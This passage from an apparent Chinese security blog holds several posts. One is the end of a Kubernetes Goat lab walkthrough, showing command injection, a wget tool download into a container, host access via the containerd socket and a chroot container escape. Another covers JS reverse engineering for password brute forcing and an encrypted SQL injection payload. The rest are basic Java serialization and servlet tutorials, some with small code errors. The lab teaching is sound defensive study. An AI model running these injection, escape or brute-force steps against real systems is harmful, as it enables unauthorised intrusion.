href="https://github.com/kubernetes-sigs/cri-tools/releases%E3%80%82">https://github.com/kubernetes-sigs/cri-tools/releases。</a><br>为了确定我们需要哪个二进制文件，我们可以运行以下命令进行系统发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;uname -a</span><br></pre></td></tr></table></figure><p>我们可以检查输出以确定系统架构和操作系统，然后将相应的二进制文件下载到容器中。例如，如果我们的目标系统是 x86_64 Linux 系统，我们可以使用以下命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;uname -a</span></span><br><span class="line">Response Output</span><br><span class="line"></span><br><span class="line">Linux health-check-deployment<span class="number">-7</span>f<span class="number">4</span>fc<span class="number">7</span><span class="keyword">c</span><span class="number">947</span>-tw<span class="number">6</span>cs <span class="number">6.12</span>.<span class="number">0</span><span class="number">-82</span>.el<span class="number">10</span>.<span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span> <span class="variable">#1</span> SMP PREEMPT_DYNAMIC Wed May <span class="number">7</span> <span class="number">19</span>:<span class="number">48</span>:<span class="number">55</span> UTC <span class="number">2025</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span> GNU/Linux</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz -O /tmp/crictl-v1.27.1.tar.gz</span><br></pre></td></tr></table></figure><p>我们可以从文件中提取二进制文件，crictl-v1.27.1.tgz以便我们可以使用它与 UNIX 套接字进行通信</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tar -xvf /tmp/crictl-v1.27.1.tar.gz -C /tmp/</span><br></pre></td></tr></table></figure><p>现在我们可以通过运行以下 crictl 命令并传递containerd.sockUNIX 套接字来访问主机系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;/tmp/crictl -r unix:///custom/containerd/containerd.sock images</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20215842.png"><br>执行命令后，可以看到主机系统中有很多容器镜像。我们可以使用不同的 crictl 命令来获得更多访问权限并进一步利用。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20222111.png"></p><h2 id="Kubernetes（K8S）中的SSRF"><a href="#Kubernetes（K8S）中的SSRF" class="headerlink" title="Kubernetes（K8S）中的SSRF"></a>Kubernetes（K8S）中的SSRF</h2><p>在场景结束时，我们将理解并学习以下内容</p><ul><li>如何利用云环境中应用程序中的 SSRF 漏洞</li><li>了解元数据查询功能以获取云提供商数据的访问权限</li><li>理解并利用 Kubernetes 原生服务发现功能和服务 DNS 查询</li><li>访问集群环境内的内部微服务</li></ul><h2 id="容器逃逸到主机系统"><a href="#容器逃逸到主机系统" class="headerlink" title="容器逃逸到主机系统"></a>容器逃逸到主机系统</h2><p>在本场景结束时，您将理解并学习以下内容：</p><ul><li>能够利用容器并从docker容器中逃逸</li><li>您将学习测试和利用配置错误和特权容器</li><li>了解容器、Kubernetes 和集群环境中的常见配置错误及其可能造成的损害<br>使用mount查看挂载信息</li></ul><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230330.png"><br>查看&#x2F;host-system<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230543.png"></p><p>将当前系统的根目录更改为 “&#x2F;host-system”。这意味着系统将认为 “&#x2F;host-system” 是根目录，并且所有的相对路径都是从 “&#x2F;host-system” 开始的。执行 “chroot &#x2F;host-system bash” 后，您将进入到一个以 “&#x2F;host-system” 为根目录的新环境，并且可以在其中运行 bash。<br>使用以下方式获取主机系统权限chroot</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /host-system bash</span><br></pre></td></tr></table></figure><p>执行docker ps<br>使用kubectl获取pods信息</p><h2 id="Docker-CIS-基准分析"><a href="#Docker-CIS-基准分析" class="headerlink" title="Docker CIS 基准分析"></a>Docker CIS 基准分析</h2><p>这种情况主要是在Kubernetes节点之上执行Docker CIS基准分析,以识别可能的安全漏洞。</p><p>运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/docker-bench-security/deployment.yaml</span><br></pre></td></tr></table></figure><p>运行容器应用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@l-virtual-machine:/opt/kubernetes-goat# kubectl get pods</span><br><span class="line"><span class="attribute">NAME</span>                                               READY   STATUS              RESTARTS   AGE</span><br><span class="line"><span class="attribute">batch</span>-check-job-t6mnv                              <span class="number">0</span>/<span class="number">1</span>     Completed           <span class="number">0</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">build</span>-code-deployment-<span class="number">7</span>d8969f879-hf88j             <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">docker</span>-bench-security-<span class="number">6</span>npjf                        <span class="number">0</span>/<span class="number">1</span>     ContainerCreating   <span class="number">0</span>          <span class="number">61</span>s</span><br><span class="line"><span class="attribute">health</span>-check-deployment-fbc7964bc-<span class="number">5</span>l6sx            <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">hidden</span>-in-layers-<span class="number">9</span>tld6                             <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">0</span>          <span class="number">136</span>m</span><br><span class="line"><span class="attribute">internal</span>-proxy-deployment-<span class="number">5489</span>c8b584-<span class="number">72</span>mhp         <span class="number">2</span>/<span class="number">2</span>     Running             <span class="number">0</span>          <span class="number">123</span>m</span><br><span class="line"><span class="attribute">kubernetes</span>-goat-home-deployment-<span class="number">655</span>d88c69f-lzb9s   <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">metadata</span>-db-<span class="number">86</span>d59569fc-nbtx2                       <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">poor</span>-registry-deployment-<span class="number">597</span>b9fb599-tfdzq          <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">system</span>-monitor-deployment-<span class="number">5678</span>ccfbc9-tqxsb         <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it docker-bench-security-6npjf  -- sh</span><br></pre></td></tr></table></figure><p>执行docker CIS基线分析脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cd docker-bench-security/</span></span><br><span class="line">~/docker-bench-security <span class="comment"># bash docker-bench-security.sh</span></span><br></pre></td></tr></table></figure><h2 id="K8S-CIS基线分析"><a href="#K8S-CIS基线分析" class="headerlink" title="K8S CIS基线分析"></a>K8S CIS基线分析</h2><p>运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line">kubectl apply -f scenarios/kube-bench-security/master-job.yaml</span><br></pre></td></tr></table></figure><p>它是一个检测任务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@l-virtual-machine:~# kubectl get jobs</span><br><span class="line"><span class="attribute">NAME</span>                COMPLETIONS   DURATION   AGE</span><br><span class="line"><span class="attribute">batch</span>-check-job     <span class="number">1</span>/<span class="number">1</span>           <span class="number">37</span>s        <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">hidden</span>-in-layers    <span class="number">0</span>/<span class="number">1</span>           <span class="number">160</span>m       <span class="number">160</span>m</span><br><span class="line"><span class="attribute">kube</span>-bench-master   <span class="number">1</span>/<span class="number">1</span>           <span class="number">4</span>m33s      <span class="number">22</span>m</span><br><span class="line"><span class="attribute">kube</span>-bench-node     <span class="number">1</span>/<span class="number">1</span>           <span class="number">4</span>m34s      <span class="number">22</span>m</span><br></pre></td></tr></table></figure><p>查看日志，可以看到K8S基线情况。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js逆向</title>
      <link href="/2025/06/17/JS%E9%80%86%E5%90%91/"/>
      <url>/2025/06/17/JS%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Js逆向"><a href="#Js逆向" class="headerlink" title="Js逆向"></a>Js逆向</h1><h2 id="JS-分析调试："><a href="#JS-分析调试：" class="headerlink" title="JS 分析调试："></a>JS 分析调试：</h2><p><strong>1，代码的全局搜索</strong></p><p>通过数据包找到关键词，并搜索</p><p><strong>2，文件流程断点</strong><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-20-1024x190.png"></p><p>找到对应数据包<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-21-1024x197.png"></p><p>在发起程序中，显示了执行 js 的流程，从下往上执行的</p><p>查看 Login js 中的代码，为登录代码</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-22-1024x442.png"></p><p>下个断点，当点击登录时，代码运行此处会暂停</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-23-1024x94.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-24-1024x255.png"></p><p>将鼠标放在 logindata 变量上</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-25-1024x310.png"></p><p>显示了加密信息</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-26.png"></p><p>在作用域中查看信息，发现加密信息是在 login 和 ajax 中完成的</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-27-1024x299.png"><br>上面的代码中显示了加密代码</p><p>点击 encrypt.encrypt () 发现了加密算法的文件</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-28-1024x404.png"></p><p><strong>3，代码标签断点</strong></p><p>右键点击登录事件，检查元素，查看登录的代码标签</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-29-1024x348.png"></p><p>将登录的标签添加断点，点击中断于属性修改</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-30-1024x551.png"></p><p>一但点击登录就会断点，能够查看某些数据</p><p>缺点：有的网站可以这样使用</p><p><strong>4，XHR 提交断点</strong></p><p>先进行请求数据</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-31-1024x92.png"></p><p>抓到数据包后，查看类型是否为 xhr，查看 url，选择具有代表性的地址</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-32.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-33.png"></p><p>在源代码页面中找到 XHR &#x2F; 提取断点，将地址输入进去，勾选内容，让浏览器去请求监控这个地址时进行断点</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-34.png"></p><p>点击登录，成功断点</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-35-1024x331.png"></p><p>通过此方法找到加密算法的文件</p><h2 id="burp-插件-jsEncrypter"><a href="#burp-插件-jsEncrypter" class="headerlink" title="burp 插件 - jsEncrypter"></a>burp 插件 - jsEncrypter</h2><p>jsEncrypter：此插件使用 phantomjs 启动前端加密函数对数据进行加密，phantomjs 会返回加密结果传给 burp。因此此插件需要启动 phantomjs 开启服务，burp 去读取结果。</p><p>需要下载 phantomjs，并且配置环境变量</p><p>下载 jsEncrypte 插件后，在此文件中有 phantomjs_server.js，在此文件中需要将 web 中找到的加密算法的文件保存到本地，并写入此文件中，再编写要对数据加密的代码</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-25-203505.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-38-1024x270.png"></p><p>payload 变量是在 burp 插件中写入的</p><p>启动 phantomjs_server.js</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-36-1024x163.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-37-1024x365.png"></p><p>成功</p><p>用处：</p><p>1，密码爆破：</p><p>在 Intruder 中使用插件</p><p>因为前端对密码进行了加密，但发现了加密算法的文件，使用此插件可对字典中的密码进行加密发送</p><p>2，注入</p><p>因为传入的数据会在请求包中被加密的，所以需要将注入的 payload 进行对应加密后传入参数</p><p>比如 sql 注入 1234’ and 1&#x3D;1 — –</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-40.png"></p><p>如果数据加密，那么注入的 payload 也需要对应加密，payload 才可以生效</p>]]></content>
      
      
      <categories>
          
          <category> Js安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Js安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-序列化和反序列化</title>
      <link href="/2025/06/17/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java-序列化与反序列化"></a>Java-序列化与反序列化</h1><p>序列化和反序列化的应用：</p><p>两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。</p><p>java 是面向对象的开发方式，一切都是 java 对象，想要在网络中传输 java 对象，可以使用序列化和反序列化去实现，发送发需要将 java 对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成 java 对象。</p><p>java 序列化的优点：</p><ul><li>实现了数据的持久化，通过序列化可以把数据持久地保存在硬盘上 (磁盘文件)。</li><li>利用序列化实现远程通信，在网络上传输字节序列</li></ul><p><strong>原生序列化操作</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;haohao&quot;</span>, <span class="number">18</span>, <span class="number">14</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        SerializableDeamo(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializableDeamo</span><span class="params">(Person obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//FileOutputStream()输出文件</span></span><br><span class="line">        <span class="comment">//将对象obj序列化后输出到文件person.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>  &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String years;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> years)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.age = years;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + age + <span class="string">&quot; &quot;</span> + years);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Name: &quot;</span> + name + <span class="string">&quot; Age: &quot;</span> + age + <span class="string">&quot; Years: &quot;</span> + age;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反序列化:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserializeTest(<span class="string">&quot;person.txt&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializeTest</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename))) &#123;</span><br><span class="line">            <span class="keyword">return</span> ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-拦截器和过滤器</title>
      <link href="/2025/06/17/Java-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2025/06/17/Java-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE-拦截器和过滤器"><a href="#JavaEE-拦截器和过滤器" class="headerlink" title="JavaEE-拦截器和过滤器"></a>JavaEE-拦截器和过滤器</h1><h2 id="过滤器（Filter）："><a href="#过滤器（Filter）：" class="headerlink" title="过滤器（Filter）："></a>过滤器（Filter）：</h2><p>过滤器 JavaWeb 三大组件之一，它与 Servlet 很相似！过滤器是用来拦截请求的，而不是处理请求的。</p><p>当用户请求某个 Servlet 时，会先执行部署在这个请求上的 Filter，如果 Filter “放行”，那么会继承执行用户请求的 Servlet；如果 Filter 不 “放行”，那么就不会执行用户请求的 Servlet。</p><p>其实可以这样理解，当用户请求某个 Servlet 时，Tomcat 会去执行注册在这个请求上的 Filter，然后是否 “放行” 由 Filter 来决定。可以理解为，Filter 来决定是否调用 Servlet！当执行完成 Servlet 的代码后，还会执行 Filter 后面的代码。</p><p>一，拦截资源路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/*&quot;)</span>   <span class="comment">//以注解的形式</span></span><br></pre></td></tr></table></figure><p>二，资源放行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/*&quot;)</span>   <span class="comment">//拦截所有资源路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在拦截&quot;</span>);</span><br><span class="line">        <span class="comment">//资源放行</span></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器应用场景"><a href="#过滤器应用场景" class="headerlink" title="过滤器应用场景"></a>过滤器应用场景</h3><p>1， 执行目标资源之前做预处理工作，例如设置编码，这种试通常都会放行，只是在目标资源执行之前做一些准备工作；</p><p>2，通过条件判断是否放行，例如校验当前用户是否已经登录，或者用户 IP 是否已经被禁用；</p><p>3，在目标资源执行后，做一些后续的特殊处理工作，例如把目标资源输出的数据进行处理；</p><h2 id="监听器（Listen）"><a href="#监听器（Listen）" class="headerlink" title="监听器（Listen）"></a>监听器（Listen）</h2><p>监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件</p><p>监听域对象的属性发生修改的事件<br>监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件</p><p>监听域对象的属性发生修改的事件</p><p>用途：</p><ul><li>统计在线人数和用户</li><li>系统启动的时候加载初始化信息</li><li>统计网站的访问量</li><li>和 Spring 结合</li><li>监听器分类：<br>监听器分类：</li></ul><p>（1）第一类：按照被监听的对象划分：ServletContext 域、ServletRequest 域、HttpSession 域。<br>（2）第二类：监听的内容划分：监听域对象的创建与销毁的监听域对象的属性变化的。</p><p><strong>ServletContextListener</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zzs.listener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServletContextListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletcontext初始化了&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletcontext销毁了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 